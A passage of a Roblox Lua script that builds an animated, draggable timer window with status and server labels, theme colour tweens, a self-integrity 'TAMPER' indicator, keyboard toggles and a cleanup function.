        local l = Instance.new("TextLabel", bx)
        l.Size = UDim2.new(1, 0, 0, 10)
        l.BackgroundTransparency = 1
        l.Text = lbl
        l.TextColor3 = P.Dim
        l.Font = Enum.Font.GothamSemibold
        l.TextSize = 7
        l.TextXAlignment = Enum.TextXAlignment.Left
        l.ZIndex = 5

        local v = Instance.new("TextLabel", bx)
        v.Size = UDim2.new(1, 0, 0, 13)
        v.Position = UDim2.new(0, 0, 0, 10)
        v.BackgroundTransparency = 1
        v.Text = val
        v.TextColor3 = color
        v.Font = Enum.Font.Code
        v.TextSize = 10
        v.TextXAlignment = Enum.TextXAlignment.Left
        v.ZIndex = 5

        return v
    end

    local statusVal = mkStat("STATUS", "ONLINE", 0, 0.5, P.Ok)
    local serverVal = mkStat("SERVER", tostring(game.JobId):sub(1, 6), 0.5, 0.5, P.Acc)

    local intDot = Instance.new("Frame", win)
    intDot.Size = UDim2.new(0, 4, 0, 4)
    intDot.Position = UDim2.new(1, -11, 1, -11)
    intDot.BackgroundColor3 = P.Ok
    intDot.BorderSizePixel = 0
    intDot.ZIndex = 6
    Instance.new("UICorner", intDot).CornerRadius = UDim.new(1, 0)

    minBtn.MouseButton1Click:Connect(function()
        S.Minimized = not S.Minimized
        if S.Minimized then
            twn(win, 0.4, {Size = UDim2.new(0, 220, 0, 60)}, Enum.EasingStyle.Quart):Play()
            ringCont.Visible = false
            infoRow.Visible = false
        else
            twnBack(win, 0.55, {Size = UDim2.new(0, 220, 0, 260)}):Play()
            task.delay(0.1, function()
                ringCont.Visible = true
                infoRow.Visible = true
            end)
        end
    end)

    local dragging = false
    local dragInput = nil
    local dragStart = nil
    local startPos = nil

    dragBar.InputBegan:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseButton1
            or inp.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragInput = inp
            dragStart = inp.Position
            startPos = win.Position
        end
    end)

    dragBar.InputChanged:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseMovement
            or inp.UserInputType == Enum.UserInputType.Touch then
            dragInput = inp
        end
    end)

    UIS.InputChanged:Connect(function(inp)
        if dragging and inp == dragInput then
            local delta = inp.Position - dragStart
            win.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
    end)

    UIS.InputEnded:Connect(function(inp)
        if dragging and (inp.UserInputType == Enum.UserInputType.MouseButton1
            or inp.UserInputType == Enum.UserInputType.Touch) then
            dragging = false
            dragInput = nil
        end
    end)

    win.Size = UDim2.new(0, 220, 0, 0)
    win.BackgroundTransparency = 1
    twnBack(win, 0.65, {
        Size = UDim2.new(0, 220, 0, 260),
        BackgroundTransparency = 0.02
    }):Play()

    task.delay(0.15, function()
        twn(mGlow, 0.6, {ImageTransparency = 0.75}):Play()
    end)

    return ringCont, infoRow, statusVal, serverVal, intDot
end

initTime()
local ringCont, infoRow, statusVal, serverVal, intDot = build()

local function updateTheme(mainC)
    if S.LastTheme == mainC then return end
    S.LastTheme = mainC
    if S.TimeLbl then twn(S.TimeLbl, 0.4, {TextColor3 = mainC}, Enum.EasingStyle.Sine):Play() end
    if S.SubLbl then twn(S.SubLbl, 0.4, {TextColor3 = mainC}, Enum.EasingStyle.Sine):Play() end
    if S.RingStroke then twn(S.RingStroke, 0.5, {Color = mainC}, Enum.EasingStyle.Sine):Play() end
    if S.InnerStroke then twn(S.InnerStroke, 0.5, {Color = mainC}, Enum.EasingStyle.Sine):Play() end
    if S.RingGlow then twn(S.RingGlow, 0.5, {ImageColor3 = mainC}, Enum.EasingStyle.Sine):Play() end
    if S.TopBar then twn(S.TopBar, 0.5, {BackgroundColor3 = mainC}, Enum.EasingStyle.Sine):Play() end
    if S.WinStroke then twn(S.WinStroke, 0.5, {Color = mainC}, Enum.EasingStyle.Sine):Play() end
    if S.MainGlow then twn(S.MainGlow, 0.6, {ImageColor3 = mainC}, Enum.EasingStyle.Sine):Play() end
    if S.StatusDot then twn(S.StatusDot, 0.4, {BackgroundColor3 = mainC}, Enum.EasingStyle.Sine):Play() end
end

local accum = 0
local heartbeatConn = RunService.Heartbeat:Connect(function(dt)
    if S.RingGradient then
        S.RingRotation = (S.RingRotation + dt * 40) % 360
        S.RingGradient.Rotation = S.RingRotation
    end
    if S.InnerGradient then
        S.InnerRotation = (S.InnerRotation + dt * 15) % 360
        S.InnerGradient.Rotation = S.InnerRotation
    end

    accum = accum + dt
    if accum < 0.1 then return end
    accum = 0
    local elapsed = computeElapsed()
    local mainC = themeOf(elapsed)
    updateTheme(mainC)
    if S.TimeLbl then S.TimeLbl.Text = fmtFull(elapsed) end
    if S.SubLbl then S.SubLbl.Text = fmtSub(elapsed) end
    if statusVal then
        if S.Fails > 0 or S.TamperFlag then
            statusVal.Text = "TAMPER"
            statusVal.TextColor3 = P.Er
        else
            statusVal.Text = "ONLINE"
            statusVal.TextColor3 = P.Ok
        end
    end
    if intDot then
        intDot.BackgroundColor3 = (S.Fails > 0 or S.TamperFlag) and P.Er or P.Ok
    end
end)

local verifyConn = RunService.Heartbeat:Connect(function()
    if not verifyAll() then
        S.Fails = S.Fails + 5
        S.TamperFlag = true
    end
end)

UIS.InputBegan:Connect(function(inp, gp)
    if gp then return end
    if inp.KeyCode == Enum.KeyCode.RightAlt then
        if S.Win then S.Win.Visible = not S.Win.Visible end
    end
    if inp.KeyCode == Enum.KeyCode.RightControl then
        if S.Win then S.Win.Visible = not S.Win.Visible end
    end
end)

LP.CharacterAdded:Connect(function()
    task.wait(0.3)
    S.Fails = 0
    S.TamperFlag = false
end)

_G._ST = function()
    if heartbeatConn then pcall(function() heartbeatConn:Disconnect() end) end
    if verifyConn then pcall(function() verifyConn:Disconnect() end) end
    if S.GUI then pcall(function() S.GUI:Destroy() end) end
end
